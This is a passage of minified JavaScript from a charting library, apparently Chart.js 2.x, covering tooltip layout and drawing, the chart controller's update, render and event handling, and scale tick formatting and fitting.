I.hasValue() && (l = I.getCenterPoint(), (c = lt.distanceBetweenPoints(e, l)) < s && (s = c, n = I)) } return n && (o = (i = n.tooltipPosition()).x, a = i.y), { x: o, y: a } } }; function _e(t, e) { return e && (lt.isArray(e) ? Array.prototype.push.apply(t, e) : t.push(e)), t } function Ve(t) { return ("string" == typeof t || t instanceof String) && -1 < t.indexOf("\n") ? t.split("\n") : t } function Le(t) { var e = st.global; return { xPadding: t.xPadding, yPadding: t.yPadding, xAlign: t.xAlign, yAlign: t.yAlign, bodyFontColor: t.bodyFontColor, _bodyFontFamily: Ye(t.bodyFontFamily, e.defaultFontFamily), _bodyFontStyle: Ye(t.bodyFontStyle, e.defaultFontStyle), _bodyAlign: t.bodyAlign, bodyFontSize: Ye(t.bodyFontSize, e.defaultFontSize), bodySpacing: t.bodySpacing, titleFontColor: t.titleFontColor, _titleFontFamily: Ye(t.titleFontFamily, e.defaultFontFamily), _titleFontStyle: Ye(t.titleFontStyle, e.defaultFontStyle), titleFontSize: Ye(t.titleFontSize, e.defaultFontSize), _titleAlign: t.titleAlign, titleSpacing: t.titleSpacing, titleMarginBottom: t.titleMarginBottom, footerFontColor: t.footerFontColor, _footerFontFamily: Ye(t.footerFontFamily, e.defaultFontFamily), _footerFontStyle: Ye(t.footerFontStyle, e.defaultFontStyle), footerFontSize: Ye(t.footerFontSize, e.defaultFontSize), _footerAlign: t.footerAlign, footerSpacing: t.footerSpacing, footerMarginTop: t.footerMarginTop, caretSize: t.caretSize, cornerRadius: t.cornerRadius, backgroundColor: t.backgroundColor, opacity: 0, legendColorBackground: t.multiKeyBackground, displayColors: t.displayColors, borderColor: t.borderColor, borderWidth: t.borderWidth } } function Me(t, e) { var n = t._chart.ctx, i = 2 * e.yPadding, o = 0, a = e.body, s = a.reduce(function (t, e) { return t + e.before.length + e.lines.length + e.after.length }, 0); s += e.beforeBody.length + e.afterBody.length; var r = e.title.length, g = e.footer.length, l = e.titleFontSize, c = e.bodyFontSize, I = e.footerFontSize; i += r * l, i += r ? (r - 1) * e.titleSpacing : 0, i += r ? e.titleMarginBottom : 0, i += s * c, i += s ? (s - 1) * e.bodySpacing : 0, i += g ? e.footerMarginTop : 0, i += g * I, i += g ? (g - 1) * e.footerSpacing : 0; function u(t) { o = Math.max(o, n.measureText(t).width + h) } var h = 0; return n.font = lt.fontString(l, e._titleFontStyle, e._titleFontFamily), lt.each(e.title, u), n.font = lt.fontString(c, e._bodyFontStyle, e._bodyFontFamily), lt.each(e.beforeBody.concat(e.afterBody), u), h = e.displayColors ? c + 2 : 0, lt.each(a, function (t) { lt.each(t.before, u), lt.each(t.lines, u), lt.each(t.after, u) }), h = 0, n.font = lt.fontString(I, e._footerFontStyle, e._footerFontFamily), lt.each(e.footer, u), { width: o += 2 * e.xPadding, height: i } } function ze(t, e) { return "center" === e ? t.x + t.width / 2 : "right" === e ? t.x + t.width - t.xPadding : t.x + t.xPadding } function Pe(t) { return _e([], Ve(t)) } var Ke = ht.extend({ initialize: function () { this._model = Le(this._options), this._lastActive = [] }, getTitle: function () { var t = this._options.callbacks, e = t.beforeTitle.apply(this, arguments), n = t.title.apply(this, arguments), i = t.afterTitle.apply(this, arguments), o = _e(o = [], Ve(e)); return o = _e(o, Ve(n)), o = _e(o, Ve(i)) }, getBeforeBody: function () { return Pe(this._options.callbacks.beforeBody.apply(this, arguments)) }, getBody: function (t, n) { var i = this, o = i._options.callbacks, a = []; return lt.each(t, function (t) { var e = { before: [], lines: [], after: [] }; _e(e.before, Ve(o.beforeLabel.call(i, t, n))), _e(e.lines, o.label.call(i, t, n)), _e(e.after, Ve(o.afterLabel.call(i, t, n))), a.push(e) }), a }, getAfterBody: function () { return Pe(this._options.callbacks.afterBody.apply(this, arguments)) }, getFooter: function () { var t = this._options.callbacks, e = t.beforeFooter.apply(this, arguments), n = t.footer.apply(this, arguments), i = t.afterFooter.apply(this, arguments), o = _e(o = [], Ve(e)); return o = _e(o, Ve(n)), o = _e(o, Ve(i)) }, update: function (t) { var e, n, i, o, a, s, r, g, l, c, I, u, h, d, C, A, p, m, f, b, B, y = this, v = y._options, x = y._model, F = y._model = Le(v), Q = y._active, G = y._data, w = { xAlign: x.xAlign, yAlign: x.yAlign }, X = { x: x.x, y: x.y }, S = { width: x.width, height: x.height }, k = { x: x.caretX, y: x.caretY }; if (Q.length) { F.opacity = 1; for (var D = [], Z = [], k = Oe[v.position].call(y, Q, y._eventPosition), U = [], W = 0, N = Q.length; W < N; ++W)U.push((d = Q[W], B = b = f = A = C = void 0, C = d._xScale, A = d._yScale || d._scale, p = d._index, m = d._datasetIndex, f = d._chart.getDatasetMeta(m).controller, b = f._getIndexScale(), B = f._getValueScale(), { xLabel: C ? C.getLabelForIndex(p, m) : "", yLabel: A ? A.getLabelForIndex(p, m) : "", label: b ? "" + b.getLabelForIndex(p, m) : "", value: B ? "" + B.getLabelForIndex(p, m) : "", index: p, datasetIndex: m, x: d._model.x, y: d._model.y })); v.filter && (U = U.filter(function (t) { return v.filter(t, G) })), v.itemSort && (U = U.sort(function (t, e) { return v.itemSort(t, e, G) })), lt.each(U, function (t) { D.push(v.callbacks.labelColor.call(y, t, y._chart)), Z.push(v.callbacks.labelTextColor.call(y, t, y._chart)) }), F.title = y.getTitle(U, G), F.beforeBody = y.getBeforeBody(U, G), F.body = y.getBody(U, G), F.afterBody = y.getAfterBody(U, G), F.footer = y.getFooter(U, G), F.x = k.x, F.y = k.y, F.caretPadding = v.caretPadding, F.labelColors = D, F.labelTextColors = Z, F.dataPoints = U, w = function (t, e) { var n, i = t._model, o = t._chart, a = t._chart.chartArea, s = "center", r = "center"; i.y < e.height ? r = "top" : i.y > o.height - e.height && (r = "bottom"); var g = (a.left + a.right) / 2, l = (a.top + a.bottom) / 2, c = "center" === r ? (n = function (t) { return t <= g }, function (t) { return g < t }) : (n = function (t) { return t <= e.width / 2 }, function (t) { return t >= o.width - e.width / 2 }), I = function (t) { return t + e.width + i.caretSize + i.caretPadding > o.width }, u = function (t) { return t - e.width - i.caretSize - i.caretPadding < 0 }, h = function (t) { return t <= l ? "top" : "bottom" }; n(i.x) ? (s = "left", I(i.x) && (s = "center", r = h(i.y))) : c(i.x) && (s = "right", u(i.x) && (s = "center", r = h(i.y))); var d = t._options; return { xAlign: d.xAlign ? d.xAlign : s, yAlign: d.yAlign ? d.yAlign : r } }(this, S = Me(this, F)), e = F, n = S, i = w, o = y._chart, a = e.x, s = e.y, r = e.caretSize, g = e.caretPadding, l = e.cornerRadius, c = i.xAlign, I = i.yAlign, u = r + g, h = l + g, "right" === c ? a -= n.width : "center" === c && ((a -= n.width / 2) + n.width > o.width && (a = o.width - n.width), a < 0 && (a = 0)), "top" === I ? s += u : s -= "bottom" === I ? n.height + u : n.height / 2, "center" === I ? "left" === c ? a += u : "right" === c && (a -= u) : "left" === c ? a -= h : "right" === c && (a += h), X = { x: a, y: s } } else F.opacity = 0; return F.xAlign = w.xAlign, F.yAlign = w.yAlign, F.x = X.x, F.y = X.y, F.width = S.width, F.height = S.height, F.caretX = k.x, F.caretY = k.y, y._model = F, t && v.custom && v.custom.call(y, F), y }, drawCaret: function (t, e) { var n = this._chart.ctx, i = this._view, o = this.getCaretPosition(t, e, i); n.lineTo(o.x1, o.y1), n.lineTo(o.x2, o.y2), n.lineTo(o.x3, o.y3) }, getCaretPosition: function (t, e, n) { var i, o, a, s, r, g, l, c = n.caretSize, I = n.cornerRadius, u = n.xAlign, h = n.yAlign, d = t.x, C = t.y, A = e.width, p = e.height; return "center" === h ? (a = C + p / 2, s = "left" === u ? (i = (l = d) - c, g = l, o = a + c, a - c) : (i = (l = d + A) + c, g = l, o = a - c, a + c)) : (g = (l = "left" === u ? (i = d + I + c) - c : "right" === u ? (i = d + A - I - c) - c : (i = n.caretX) - c, i + c), "top" === h ? (a = (o = C) - c, s = o) : (a = (o = C + p) + c, s = o, r = g, g = l, l = r)), { x1: l, x2: i, x3: g, y1: o, y2: a, y3: s } }, drawTitle: function (t, e, n) { var i = e.title; if (i.length) { t.x = ze(e, e._titleAlign), n.textAlign = e._titleAlign, n.textBaseline = "top"; var o, a, s = e.titleFontSize, r = e.titleSpacing; for (n.fillStyle = e.titleFontColor, n.font = lt.fontString(s, e._titleFontStyle, e._titleFontFamily), o = 0, a = i.length; o < a; ++o)n.fillText(i[o], t.x, t.y), t.y += s + r, o + 1 === i.length && (t.y += e.titleMarginBottom - r) } }, drawBody: function (n, i, o) { var a, s = i.bodyFontSize, e = i.bodySpacing, t = i._bodyAlign, r = i.body, g = i.displayColors, l = i.labelColors, c = 0, I = g ? ze(i, "left") : 0; o.textAlign = t, o.textBaseline = "top", o.font = lt.fontString(s, i._bodyFontStyle, i._bodyFontFamily), n.x = ze(i, t); function u(t) { o.fillText(t, n.x + c, n.y), n.y += s + e } o.fillStyle = i.bodyFontColor, lt.each(i.beforeBody, u), c = g && "right" !== t ? "center" === t ? s / 2 + 1 : s + 2 : 0, lt.each(r, function (t, e) { a = i.labelTextColors[e], o.fillStyle = a, lt.each(t.before, u), lt.each(t.lines, function (t) { g && (o.fillStyle = i.legendColorBackground, o.fillRect(I, n.y, s, s), o.lineWidth = 1, o.strokeStyle = l[e].borderColor, o.strokeRect(I, n.y, s, s), o.fillStyle = l[e].backgroundColor, o.fillRect(I + 1, n.y + 1, s - 2, s - 2), o.fillStyle = a), u(t) }), lt.each(t.after, u) }), c = 0, lt.each(i.afterBody, u), n.y -= e }, drawFooter: function (e, n, i) { var t = n.footer; t.length && (e.x = ze(n, n._footerAlign), e.y += n.footerMarginTop, i.textAlign = n._footerAlign, i.textBaseline = "top", i.fillStyle = n.footerFontColor, i.font = lt.fontString(n.footerFontSize, n._footerFontStyle, n._footerFontFamily), lt.each(t, function (t) { i.fillText(t, e.x, e.y), e.y += n.footerFontSize + n.footerSpacing })) }, drawBackground: function (t, e, n, i) { n.fillStyle = e.backgroundColor, n.strokeStyle = e.borderColor, n.lineWidth = e.borderWidth; var o = e.xAlign, a = e.yAlign, s = t.x, r = t.y, g = i.width, l = i.height, c = e.cornerRadius; n.beginPath(), n.moveTo(s + c, r), "top" === a && this.drawCaret(t, i), n.lineTo(s + g - c, r), n.quadraticCurveTo(s + g, r, s + g, r + c), "center" === a && "right" === o && this.drawCaret(t, i), n.lineTo(s + g, r + l - c), n.quadraticCurveTo(s + g, r + l, s + g - c, r + l), "bottom" === a && this.drawCaret(t, i), n.lineTo(s + c, r + l), n.quadraticCurveTo(s, r + l, s, r + l - c), "center" === a && "left" === o && this.drawCaret(t, i), n.lineTo(s, r + c), n.quadraticCurveTo(s, r, s + c, r), n.closePath(), n.fill(), 0 < e.borderWidth && n.stroke() }, draw: function () { var t, e, n, i, o = this._chart.ctx, a = this._view; 0 !== a.opacity && (t = { width: a.width, height: a.height }, e = { x: a.x, y: a.y }, n = Math.abs(a.opacity < .001) ? 0 : a.opacity, i = a.title.length || a.beforeBody.length || a.body.length || a.afterBody.length || a.footer.length, this._options.enabled && i && (o.save(), o.globalAlpha = n, this.drawBackground(e, a, o, t), e.y += a.yPadding, this.drawTitle(e, a, o), this.drawBody(e, a, o), this.drawFooter(e, a, o), o.restore())) }, handleEvent: function (t) { var e, n = this, i = n._options; return n._lastActive = n._lastActive || [], "mouseout" === t.type ? n._active = [] : n._active = n._chart.getElementsAtEventForMode(t, i.mode, i), (e = !lt.arrayEquals(n._active, n._lastActive)) && (n._lastActive = n._active, (i.enabled || i.custom) && (n._eventPosition = { x: t.x, y: t.y }, n.update(!0), n.pivot())), e } }); Ke.positioners = Oe; var Je = lt.valueOrDefault; function je() { return lt.merge({}, [].slice.call(arguments), { merger: function (t, e, n, i) { if ("xAxes" === t || "yAxes" === t) { var o, a, s, r = n[t].length; for (e[t] || (e[t] = []), o = 0; o < r; ++o)s = n[t][o], a = Je(s.type, "xAxes" === t ? "category" : "linear"), o >= e[t].length && e[t].push({}), !e[t][o].type || s.type && s.type !== e[t][o].type ? lt.merge(e[t][o], [Re.getScaleDefaults(a), s]) : lt.merge(e[t][o], s) } else lt._merger(t, e, n, i) } }) } function $e() { return lt.merge({}, [].slice.call(arguments), { merger: function (t, e, n, i) { var o = e[t] || {}, a = n[t]; "scales" === t ? e[t] = je(o, a) : "scale" === t ? e[t] = lt.merge(o, [Re.getScaleDefaults(a.type), a]) : lt._merger(t, e, n, i) } }) } function qe(t) { return "top" === t || "bottom" === t } st._set("global", { elements: {}, events: ["mousemove", "mouseout", "click", "touchstart", "touchmove"], hover: { onHover: null, mode: "nearest", intersect: !0, animationDuration: 400 }, onClick: null, maintainAspectRatio: !0, responsive: !0, responsiveAnimationDuration: 0 }); function tn(t, e) { return this.construct(t, e), this } lt.extend(tn.prototype, { construct: function (t, e) { var n, i, o = this; (i = (n = (n = e) || {}).data = n.data || {}).datasets = i.datasets || [], i.labels = i.labels || [], n.options = $e(st.global, st[n.type], n.options || {}), e = n; var a = He.acquireContext(t, e), s = a && a.canvas, r = s && s.height, g = s && s.width; o.id = lt.uid(), o.ctx = a, o.canvas = s, o.config = e, o.width = g, o.height = r, o.aspectRatio = r ? g / r : null, o.options = e.options, o._bufferedRender = !1, (o.chart = o).controller = o, tn.instances[o.id] = o, Object.defineProperty(o, "data", { get: function () { return o.config.data }, set: function (t) { o.config.data = t } }), a && s ? (o.initialize(), o.update()) : console.error("Failed to create chart: can't acquire context from the given item") }, initialize: function () { var t = this; return Ee.notify(t, "beforeInit"), lt.retinaScale(t, t.options.devicePixelRatio), t.bindEvents(), t.options.responsive && t.resize(!0), t.ensureScalesHaveIDs(), t.buildOrUpdateScales(), t.initToolTip(), Ee.notify(t, "afterInit"), t }, clear: function () { return lt.canvas.clear(this), this }, stop: function () { return At.cancelAnimation(this), this }, resize: function (t) { var e, n = this, i = n.options, o = n.canvas, a = i.maintainAspectRatio && n.aspectRatio || null, s = Math.max(0, Math.floor(lt.getMaximumWidth(o))), r = Math.max(0, Math.floor(a ? s / a : lt.getMaximumHeight(o))); n.width === s && n.height === r || (o.width = n.width = s, o.height = n.height = r, o.style.width = s + "px", o.style.height = r + "px", lt.retinaScale(n, i.devicePixelRatio), t || (e = { width: s, height: r }, Ee.notify(n, "resize", [e]), i.onResize && i.onResize(n, e), n.stop(), n.update({ duration: i.responsiveAnimationDuration }))) }, ensureScalesHaveIDs: function () { var t = this.options, e = t.scales || {}, n = t.scale; lt.each(e.xAxes, function (t, e) { t.id = t.id || "x-axis-" + e }), lt.each(e.yAxes, function (t, e) { t.id = t.id || "y-axis-" + e }), n && (n.id = n.id || "scale") }, buildOrUpdateScales: function () { var s = this, t = s.options, r = s.scales || {}, e = [], g = Object.keys(r).reduce(function (t, e) { return t[e] = !1, t }, {}); t.scales && (e = e.concat((t.scales.xAxes || []).map(function (t) { return { options: t, dtype: "category", dposition: "bottom" } }), (t.scales.yAxes || []).map(function (t) { return { options: t, dtype: "linear", dposition: "left" } }))), t.scale && e.push({ options: t.scale, dtype: "radialLinear", isDefault: !0, dposition: "chartArea" }), lt.each(e, function (t) { var e = t.options, n = e.id, i = Je(e.type, t.dtype); qe(e.position) !== qe(t.dposition) && (e.position = t.dposition), g[n] = !0; var o = null; if (n in r && r[n].type === i) (o = r[n]).options = e, o.ctx = s.ctx, o.chart = s; else { var a = Re.getScaleConstructor(i); if (!a) return; o = new a({ id: n, type: i, options: e, ctx: s.ctx, chart: s }), r[o.id] = o } o.mergeTicksOptions(), t.isDefault && (s.scale = o) }), lt.each(g, function (t, e) { t || delete r[e] }), s.scales = r, Re.addScalesToLayout(this) }, buildOrUpdateControllers: function () { var a = this, s = []; return lt.each(a.data.datasets, function (t, e) { var n = a.getDatasetMeta(e), i = t.type || a.config.type; if (n.type && n.type !== i && (a.destroyDatasetMeta(e), n = a.getDatasetMeta(e)), n.type = i, n.controller) n.controller.updateIndex(e), n.controller.linkScales(); else { var o = re[n.type]; if (void 0 === o) throw new Error('"' + n.type + '" is not a chart type.'); n.controller = new o(a, e), s.push(n.controller) } }, a), s }, resetElements: function () { var n = this; lt.each(n.data.datasets, function (t, e) { n.getDatasetMeta(e).controller.reset() }, n) }, reset: function () { this.resetElements(), this.tooltip.initialize() }, update: function (t) { var e, n, i, o = this; t && "object" == typeof t || (t = { duration: t, lazy: arguments[1] }), n = (e = o).options, lt.each(e.scales, function (t) { me.removeBox(e, t) }), n = $e(st.global, st[e.config.type], n), e.options = e.config.options = n, e.ensureScalesHaveIDs(), e.buildOrUpdateScales(), e.tooltip._options = n.tooltips, e.tooltip.initialize(), Ee._invalidate(o), !1 !== Ee.notify(o, "beforeUpdate") && (o.tooltip._data = o.data, i = o.buildOrUpdateControllers(), lt.each(o.data.datasets, function (t, e) { o.getDatasetMeta(e).controller.buildOrUpdateElements() }, o), o.updateLayout(), o.options.animation && o.options.animation.duration && lt.each(i, function (t) { t.reset() }), o.updateDatasets(), o.tooltip.initialize(), o.lastActive = [], Ee.notify(o, "afterUpdate"), o._bufferedRender ? o._bufferedRequest = { duration: t.duration, easing: t.easing, lazy: t.lazy } : o.render(t)) }, updateLayout: function () { !1 !== Ee.notify(this, "beforeLayout") && (me.update(this, this.width, this.height), Ee.notify(this, "afterScaleUpdate"), Ee.notify(this, "afterLayout")) }, updateDatasets: function () { if (!1 !== Ee.notify(this, "beforeDatasetsUpdate")) { for (var t = 0, e = this.data.datasets.length; t < e; ++t)this.updateDataset(t); Ee.notify(this, "afterDatasetsUpdate") } }, updateDataset: function (t) { var e = this.getDatasetMeta(t), n = { meta: e, index: t }; !1 !== Ee.notify(this, "beforeDatasetUpdate", [n]) && (e.controller.update(), Ee.notify(this, "afterDatasetUpdate", [n])) }, render: function (t) { var e = this; t && "object" == typeof t || (t = { duration: t, lazy: arguments[1] }); var n = e.options.animation, i = Je(t.duration, n && n.duration), o = t.lazy; if (!1 !== Ee.notify(e, "beforeRender")) { var a, s = function (t) { Ee.notify(e, "afterRender"), lt.callback(n && n.onComplete, [t], e) }; return n && i ? (a = new Ct({ numSteps: i / 16.66, easing: t.easing || n.easing, render: function (t, e) { var n = lt.easing.effects[e.easing], i = e.currentStep, o = i / e.numSteps; t.draw(n(o), o, i) }, onAnimationProgress: n.onProgress, onAnimationComplete: s }), At.addAnimation(e, a, i, o)) : (e.draw(), s(new Ct({ numSteps: 0, chart: e }))), e } }, draw: function (t) { var e = this; e.clear(), lt.isNullOrUndef(t) && (t = 1), e.transition(t), e.width <= 0 || e.height <= 0 || !1 !== Ee.notify(e, "beforeDraw", [t]) && (lt.each(e.boxes, function (t) { t.draw(e.chartArea) }, e), e.drawDatasets(t), e._drawTooltip(t), Ee.notify(e, "afterDraw", [t])) }, transition: function (t) { for (var e = 0, n = (this.data.datasets || []).length; e < n; ++e)this.isDatasetVisible(e) && this.getDatasetMeta(e).controller.transition(t); this.tooltip.transition(t) }, drawDatasets: function (t) { if (!1 !== Ee.notify(this, "beforeDatasetsDraw", [t])) { for (var e = (this.data.datasets || []).length - 1; 0 <= e; --e)this.isDatasetVisible(e) && this.drawDataset(e, t); Ee.notify(this, "afterDatasetsDraw", [t]) } }, drawDataset: function (t, e) { var n = this.getDatasetMeta(t), i = { meta: n, index: t, easingValue: e }; !1 !== Ee.notify(this, "beforeDatasetDraw", [i]) && (n.controller.draw(e), Ee.notify(this, "afterDatasetDraw", [i])) }, _drawTooltip: function (t) { var e = this.tooltip, n = { tooltip: e, easingValue: t }; !1 !== Ee.notify(this, "beforeTooltipDraw", [n]) && (e.draw(), Ee.notify(this, "afterTooltipDraw", [n])) }, getElementAtEvent: function (t) { return de.modes.single(this, t) }, getElementsAtEvent: function (t) { return de.modes.label(this, t, { intersect: !0 }) }, getElementsAtXAxis: function (t) { return de.modes["x-axis"](this, t, { intersect: !0 }) }, getElementsAtEventForMode: function (t, e, n) { var i = de.modes[e]; return "function" == typeof i ? i(this, t, n) : [] }, getDatasetAtEvent: function (t) { return de.modes.dataset(this, t, { intersect: !0 }) }, getDatasetMeta: function (t) { var e = this.data.datasets[t]; return e._meta || (e._meta = {}), e._meta[this.id] || (e._meta[this.id] = { type: null, data: [], dataset: null, controller: null, hidden: null, xAxisID: null, yAxisID: null }) }, getVisibleDatasetCount: function () { for (var t = 0, e = 0, n = this.data.datasets.length; e < n; ++e)this.isDatasetVisible(e) && t++; return t }, isDatasetVisible: function (t) { var e = this.getDatasetMeta(t); return "boolean" == typeof e.hidden ? !e.hidden : !this.data.datasets[t].hidden }, generateLegend: function () { return this.options.legendCallback(this) }, destroyDatasetMeta: function (t) { var e = this.id, n = this.data.datasets[t], i = n._meta && n._meta[e]; i && (i.controller.destroy(), delete n._meta[e]) }, destroy: function () { var t, e, n = this, i = n.canvas; for (n.stop(), t = 0, e = n.data.datasets.length; t < e; ++t)n.destroyDatasetMeta(t); i && (n.unbindEvents(), lt.canvas.clear(n), He.releaseContext(n.ctx), n.canvas = null, n.ctx = null), Ee.notify(n, "destroy"), delete tn.instances[n.id] }, toBase64Image: function () { return this.canvas.toDataURL.apply(this.canvas, arguments) }, initToolTip: function () { this.tooltip = new Ke({ _chart: this, _chartInstance: this, _data: this.data, _options: this.options.tooltips }, this) }, bindEvents: function () { var e = this, n = e._listeners = {}, i = function () { e.eventHandler.apply(e, arguments) }; lt.each(e.options.events, function (t) { He.addEventListener(e, t, i), n[t] = i }), e.options.responsive && (i = function () { e.resize() }, He.addEventListener(e, "resize", i), n.resize = i) }, unbindEvents: function () { var n = this, t = n._listeners; t && (delete n._listeners, lt.each(t, function (t, e) { He.removeEventListener(n, e, t) })) }, updateHoverStyle: function (t, e, n) { for (var i, o = n ? "setHoverStyle" : "removeHoverStyle", a = 0, s = t.length; a < s; ++a)(i = t[a]) && this.getDatasetMeta(i._datasetIndex).controller[o](i) }, eventHandler: function (t) { var e = this, n = e.tooltip; if (!1 !== Ee.notify(e, "beforeEvent", [t])) { e._bufferedRender = !0, e._bufferedRequest = null; var i = e.handleEvent(t); n && (i = n._start ? n.handleEvent(t) : i | n.handleEvent(t)), Ee.notify(e, "afterEvent", [t]); var o = e._bufferedRequest; return o ? e.render(o) : i && !e.animating && (e.stop(), e.render({ duration: e.options.hover.animationDuration, lazy: !0 })), e._bufferedRender = !1, e._bufferedRequest = null, e } }, handleEvent: function (t) { var e, n = this, i = n.options || {}, o = i.hover; return n.lastActive = n.lastActive || [], "mouseout" === t.type ? n.active = [] : n.active = n.getElementsAtEventForMode(t, o.mode, o), lt.callback(i.onHover || i.hover.onHover, [t.native, n.active], n), "mouseup" !== t.type && "click" !== t.type || i.onClick && i.onClick.call(n, t.native, n.active), n.lastActive.length && n.updateHoverStyle(n.lastActive, o.mode, !1), n.active.length && o.mode && n.updateHoverStyle(n.active, o.mode, !0), e = !lt.arrayEquals(n.active, n.lastActive), n.lastActive = n.active, e } }), tn.instances = {}; var en = tn; (tn.Controller = tn).types = {}, lt.configMerge = $e, lt.scaleMerge = je; function nn() { throw new Error("This method is not implemented: either no adapter can be found or an incomplete integration was provided.") } function on(t) { this.options = t || {} } lt.extend(on.prototype, { formats: nn, parse: nn, format: nn, add: nn, diff: nn, startOf: nn, endOf: nn, _create: function (t) { return t } }), on.override = function (t) { lt.extend(on.prototype, t) }; var an = { _date: on }, sn = { formatters: { values: function (t) { return lt.isArray(t) ? t : "" + t }, linear: function (t, e, n) { var i = 3 < n.length ? n[2] - n[1] : n[1] - n[0]; 1 < Math.abs(i) && t !== Math.floor(t) && (i = t - Math.floor(t)); var o, a, s = lt.log10(Math.abs(i)); return 0 !== t ? Math.max(Math.abs(n[0]), Math.abs(n[n.length - 1])) < 1e-4 ? (o = lt.log10(Math.abs(t)), t.toExponential(Math.floor(o) - Math.floor(s))) : (a = -1 * Math.floor(s), a = Math.max(Math.min(a, 20), 0), t.toFixed(a)) : "0" }, logarithmic: function (t, e, n) { var i = t / Math.pow(10, Math.floor(lt.log10(t))); return 0 === t ? "0" : 1 == i || 2 == i || 5 == i || 0 === e || e === n.length - 1 ? t.toExponential() : "" } } }, rn = lt.valueOrDefault, gn = lt.valueAtIndexOrDefault; function ln(t) { for (var e = [], n = 0, i = t.length; n < i; ++n)e.push(t[n].label); return e } function cn(t, e, n) { return lt.isArray(e) ? lt.longestText(t, n, e) : t.measureText(e).width } st._set("scale", { display: !0, position: "left", offset: !1, gridLines: { display: !0, color: "rgba(0, 0, 0, 0.1)", lineWidth: 1, drawBorder: !0, drawOnChartArea: !0, drawTicks: !0, tickMarkLength: 10, zeroLineWidth: 1, zeroLineColor: "rgba(0,0,0,0.25)", zeroLineBorderDash: [], zeroLineBorderDashOffset: 0, offsetGridLines: !1, borderDash: [], borderDashOffset: 0 }, scaleLabel: { display: !1, labelString: "", padding: { top: 4, bottom: 4 } }, ticks: { beginAtZero: !1, minRotation: 0, maxRotation: 50, mirror: !1, padding: 0, reverse: !1, display: !0, autoSkip: !0, autoSkipPadding: 0, labelOffset: 0, callback: sn.formatters.values, minor: {}, major: {} } }); var In = ht.extend({ getPadding: function () { return { left: this.paddingLeft || 0, top: this.paddingTop || 0, right: this.paddingRight || 0, bottom: this.paddingBottom || 0 } }, getTicks: function () { return this._ticks }, mergeTicksOptions: function () { var t = this.options.ticks; for (var e in !1 === t.minor && (t.minor = { display: !1 }), !1 === t.major && (t.major = { display: !1 }), t) "major" !== e && "minor" !== e && (void 0 === t.minor[e] && (t.minor[e] = t[e]), void 0 === t.major[e] && (t.major[e] = t[e])) }, beforeUpdate: function () { lt.callback(this.options.beforeUpdate, [this]) }, update: function (t, e, n) { var i, o, a, s, r, g, l = this; for (l.beforeUpdate(), l.maxWidth = t, l.maxHeight = e, l.margins = lt.extend({ left: 0, right: 0, top: 0, bottom: 0 }, n), l._maxLabelLines = 0, l.longestLabelWidth = 0, l.longestTextCache = l.longestTextCache || {}, l.beforeSetDimensions(), l.setDimensions(), l.afterSetDimensions(), l.beforeDataLimits(), l.determineDataLimits(), l.afterDataLimits(), l.beforeBuildTicks(), r = l.buildTicks() || [], r = l.afterBuildTicks(r) || r, l.beforeTickToLabelConversion(), a = l.convertTicksToLabels(r) || l.ticks, l.afterTickToLabelConversion(), i = 0, o = (l.ticks = a).length; i < o; ++i)s = a[i], (g = r[i]) ? g.label = s : r.push(g = { label: s, major: !1 }); return l._ticks = r, l.beforeCalculateTickRotation(), l.calculateTickRotation(), l.afterCalculateTickRotation(), l.beforeFit(), l.fit(), l.afterFit(), l.afterUpdate(), l.minSize }, afterUpdate: function () { lt.callback(this.options.afterUpdate, [this]) }, beforeSetDimensions: function () { lt.callback(this.options.beforeSetDimensions, [this]) }, setDimensions: function () { var t = this; t.isHorizontal() ? (t.width = t.maxWidth, t.left = 0, t.right = t.width) : (t.height = t.maxHeight, t.top = 0, t.bottom = t.height), t.paddingLeft = 0, t.paddingTop = 0, t.paddingRight = 0, t.paddingBottom = 0 }, afterSetDimensions: function () { lt.callback(this.options.afterSetDimensions, [this]) }, beforeDataLimits: function () { lt.callback(this.options.beforeDataLimits, [this]) }, determineDataLimits: lt.noop, afterDataLimits: function () { lt.callback(this.options.afterDataLimits, [this]) }, beforeBuildTicks: function () { lt.callback(this.options.beforeBuildTicks, [this]) }, buildTicks: lt.noop, afterBuildTicks: function (t) { return lt.isArray(t) && t.length ? lt.callback(this.options.afterBuildTicks, [this, t]) : (this.ticks = lt.callback(this.options.afterBuildTicks, [this, this.ticks]) || this.ticks, t) }, beforeTickToLabelConversion: function () { lt.callback(this.options.beforeTickToLabelConversion, [this]) }, convertTicksToLabels: function () { var t = this.options.ticks; this.ticks = this.ticks.map(t.userCallback || t.callback, this) }, afterTickToLabelConversion: function () { lt.callback(this.options.afterTickToLabelConversion, [this]) }, beforeCalculateTickRotation: function () { lt.callback(this.options.beforeCalculateTickRotation, [this]) }, calculateTickRotation: function () { var t = this, e = t.ctx, n = t.options.ticks, i = ln(t._ticks), o = lt.options._parseFont(n); e.font = o.string; var a = n.minRotation || 0; if (i.length && t.options.display && t.isHorizontal()) for (var s = lt.longestText(e, o.string, i, t.longestTextCache), r = s, g = t.getPixelForTick(1) - t.getPixelForTick(0) - 6; g < r && a < n.maxRotation;) { var l = lt.toRadians(a), c = Math.cos(l); if (Math.sin(l) * s > t.maxHeight) { a--; break } a++, r = c * s } t.labelRotation = a }, afterCalculateTickRotation: function () { lt.callback(this.options.afterCalculateTickRotation, [this]) }, beforeFit: function () { lt.callback(this.options.beforeFit, [this]) }, fit: function () { var t, e, n, i, o, a, s, r, g, l, c, I, u, h, d, C, A = this, p = A.minSize = { width: 0, height: 0 }, m = ln(A._ticks), f = A.options, b = f.ticks, B = f.scaleLabel, y = f.gridLines, v = A._isVisible(), x = f.position, F = A.isHorizontal(), Q = lt.options._parseFont, G = Q(b), w = f.gridLines.tickMarkLength; p.width = F ? A.isFullWidth() ? A.maxWidth - A.margins.left - A.margins.right : A.maxWidth : v && y.drawTicks ? w : 0, p.height = F ? v && y.drawTicks ? w : 0 : A.maxHeight, B.display && v && (t = Q(B), e = lt.options.toPadding(B.padding), n = t.lineHeight + e.height, F ? p.height += n : p.width += n), b.display && v && (i = lt.longestText(A.ctx, G.string, m, A.longestTextCache), o = lt.numberOfLabelLines(m), a = .5 * G.size, s = A.options.ticks.padding, A._maxLabelLines = o, A.longestLabelWidth = i, F ? (r = lt.toRadians(A.labelRotation), g = Math.cos(r), l = Math.sin(r) * i + G.lineHeight * o + a, p.height = Math.min(A.maxHeight, p.height + l + s), A.ctx.font = G.string, c = cn(A.ctx, m[0], G.string), I = cn(A.ctx, m[m.length - 1], G.string), u = A.getPixelForTick(0) - A.left, h = A.right - A.getPixelForTick(m.length - 1), C = 0 !== A.labelRotation ? (d = "bottom" === x ? g * c : g * a, "bottom" === x ? g * a : g * I) : (d = c / 2, I / 2), A.paddingLeft = 